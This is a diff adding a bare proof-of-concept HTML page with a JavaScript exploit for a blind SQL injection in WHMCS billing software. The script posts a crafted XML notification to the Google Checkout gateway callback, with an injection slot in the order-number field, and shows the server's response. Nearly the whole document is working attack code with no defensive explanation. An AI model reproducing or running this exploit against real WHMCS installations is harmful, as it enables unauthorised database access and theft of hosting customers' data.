@@ -1,0 +1,29 @@
+#Proof of Concept : 
+
+<html>
+<head>
+<title>WHMCS Blind SQL Injection POC</title>
+</head>
+<body>
+<script>
+var params = "<charge-amount-notification><google-order-number>0' %YOUR INJECTION HERE% -- -</google-order-number><new-fulfillment-order-state>charge-amount-notification</new-fulfillment-order-state></charge-amount-notification>";
+    var http = new XMLHttpRequest();
+ try {
+        netscape.security.PrivilegeManager.enablePrivilege("UniversalBrowserRead");
+    } catch (e) {
+        alert("Permission UniversalBrowserRead denied.");
+    }
+    http.open("POST", "http://site.com/whmcs/modules/gateways/callback/googlecheckout.php", true);
+    http.onreadystatechange = handleResponse;
+    http.send(params);
+function handleResponse() {
+
+  if(http.readyState == 4 && http.status == 200){
+    var response = http.responseText;
+alert(response);
+    }
+  }  
+</script>
+</body>
+</html>
+
